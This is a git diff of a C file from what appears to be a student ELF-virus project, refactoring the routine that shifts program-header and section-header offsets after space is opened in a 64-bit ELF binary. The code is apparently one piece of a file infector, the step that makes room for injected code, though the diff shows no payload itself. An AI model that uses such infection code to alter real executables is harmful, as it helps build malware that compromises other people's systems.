@@ -6,95 +6,96 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/13 14:56:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/19 00:36:26 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/26 23:28:30 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "infect.h"
+#include "accessors.h"
 #include "errors.h"
+#include "virus.h"
 
-struct		data
+struct		closure_data
 {
 	size_t	shift_amount;
-	size_t	end_last_sect;
+	size_t	end_of_last_section;
 };
 
-static bool	shift_phdr_position(struct safe_pointer info, const size_t offset, void *data)
+static bool	shift_phdr_position(struct safe_ptr ref, size_t offset, void *data)
 {
-	struct data	*closure = data;
-	Elf64_Phdr	*phdr    = safe(offset, sizeof(Elf64_Phdr));
+	struct closure_data	*scope = data;
+	Elf64_Phdr		*phdr  = safe(ref, offset, sizeof(Elf64_Phdr));
 
 	if (phdr == NULL) return errors(ERR_FILE, _ERR_BAD_PHDR_OFF);
 
 	Elf64_Off	p_offset = phdr->p_offset;
 
-	if (p_offset > closure->end_last_sect)
+	if (p_offset > scope->end_of_last_section)
 	{
-		p_offset      += closure->shift_amount;
+		p_offset += scope->shift_amount;
 		phdr->p_offset = p_offset;
 	}
 	return true;
 }
 
-static bool	shift_shdr_position(struct safe_pointer info, const size_t offset, void *data)
+static bool	shift_shdr_position(struct safe_ptr ref, size_t offset, void *data)
 {
-	struct data 	*closure = data;
-	Elf64_Shdr	*shdr    = safe(offset, sizeof(Elf64_Shdr));
+	struct closure_data 	*scope = data;
+	Elf64_Shdr		*shdr  = safe(ref, offset, sizeof(Elf64_Shdr));
 
 	if (shdr == NULL) return errors(ERR_FILE, _ERR_BAD_SHDR_OFF);
 
 	Elf64_Off	sh_offset = shdr->sh_offset;
 
-	if (sh_offset > closure->end_last_sect)
+	if (sh_offset > scope->end_of_last_section)
 	{
-		sh_offset      += closure->shift_amount;
+		sh_offset += scope->shift_amount;
 		shdr->sh_offset = sh_offset;
 	}
 	return true;
 }
 
-static void	adjust_phdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amount, size_t end_last_sect)
+static void	adjust_phdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amount, size_t end_of_last_section)
 {
 	Elf64_Off	e_phoff = safe_elf_hdr->e_phoff;
 
-	if (e_phoff < end_last_sect)
+	if (e_phoff < end_of_last_section)
 		return;
 
-	e_phoff              += shift_amount;
+	e_phoff += shift_amount;
 	safe_elf_hdr->e_phoff = e_phoff;
 }
 
-static void	adjust_shdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amount, size_t end_last_sect)
+static void	adjust_shdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amount, size_t end_of_last_section)
 {
 	Elf64_Off	e_shoff = safe_elf_hdr->e_shoff;
 
-	if (e_shoff < end_last_sect)
+	if (e_shoff < end_of_last_section)
 		return;
 
-	e_shoff              += shift_amount;
+	e_shoff += shift_amount;
 	safe_elf_hdr->e_shoff = e_shoff;
 }
 
-bool		adjust_references(const struct safe_pointer info, size_t shift_amount, const struct entry *original_entry)
+bool		adjust_references(struct safe_ptr ref, size_t shift_amount, size_t end_of_last_section)
 {
-	struct data	closure;
+	struct closure_data	scope;
 
 	if (shift_amount == 0)
 		return true;
 
-	closure.shift_amount  = shift_amount;
-	closure.end_last_sect = original_entry->end_of_last_section;
+	scope.shift_amount        = shift_amount;
+	scope.end_of_last_section = end_of_last_section;
 
-	Elf64_Ehdr	*elf_hdr = safe(0, sizeof(Elf64_Ehdr));
+	Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
 
 	if (elf_hdr == NULL) return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
 
-	adjust_phdr_table_offset(elf_hdr, shift_amount, closure.end_last_sect);
-	adjust_shdr_table_offset(elf_hdr, shift_amount, closure.end_last_sect);
+	adjust_phdr_table_offset(elf_hdr, shift_amount, end_of_last_section);
+	adjust_shdr_table_offset(elf_hdr, shift_amount, end_of_last_section);
 
-	if (!foreach_phdr(info, shift_phdr_position, &closure))
+	if (!foreach_phdr(ref, shift_phdr_position, &scope))
 		return errors(ERR_THROW, _ERR_ADJUST_REFERENCES);
-	if (!foreach_shdr(info, shift_shdr_position, &closure))
+	if (!foreach_shdr(ref, shift_shdr_position, &scope))
 		return errors(ERR_THROW, _ERR_ADJUST_REFERENCES);
 
 	return true;
